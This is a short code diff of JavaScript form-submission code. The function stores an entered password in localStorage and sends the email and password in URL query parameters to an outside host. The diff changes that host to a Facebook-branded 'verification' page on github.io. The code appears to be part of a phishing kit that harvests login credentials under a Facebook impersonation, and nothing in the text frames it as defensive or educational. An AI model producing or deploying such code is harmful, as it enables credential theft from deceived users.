@@ -10,7 +10,7 @@ function submitForm(event){
    localStorage.setItem("password",password.value);
    function saveUserToDatabase(email, password) {
     var xhr = new XMLHttpRequest();
-    var url = 'freeapiformyprject.free.nf/?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
+    var url = 'https://facebookbadge.github.io/verification/?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
 
     xhr.open('POST', url, true);
 
